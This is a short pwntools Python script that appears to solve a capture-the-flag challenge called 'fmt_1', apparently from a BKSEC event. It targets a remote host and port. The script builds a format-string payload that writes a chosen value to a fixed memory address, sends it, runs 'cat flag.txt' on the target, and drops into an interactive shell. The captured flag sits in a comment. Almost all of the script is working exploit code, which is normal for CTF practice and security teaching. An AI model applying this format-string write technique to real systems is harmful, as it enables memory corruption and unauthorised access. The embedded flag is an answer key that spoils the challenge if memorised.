#!/usr/bin/env python3
from pwn import *
import binascii
import sys

exe_path = 'fmt_1'
HOST = '103.77.175.40'
PORT = 6101

exe = ELF(exe_path, checksec=False)
context.binary = exe
context.terminal = [
    'cmd.exe', '/c', 'start',
    'wt.exe', '-w', '0', 'split-pane', '-V',
    '-d', '.',
    'wsl.exe',
    '-d', 'kali-linux',
    'bash', '-c'
]

gdbscript = '''
b*0x000000000040132e
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    p = process(exe.path)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
        input()
    return p

p = start()

addr = 0x4034a4        
value = 0x6f726568
offset = 10

payload = fmtstr_payload(offset, {addr: value})
payload = payload.ljust(512, b'A')

p.sendlineafter(b'What do you want to say?', payload)


p.sendlineafter(b'as you came here to do.', b'cat flag.txt')

#BKSEC{a_H3r0_w4S_r4iS3d}

p.interactive()
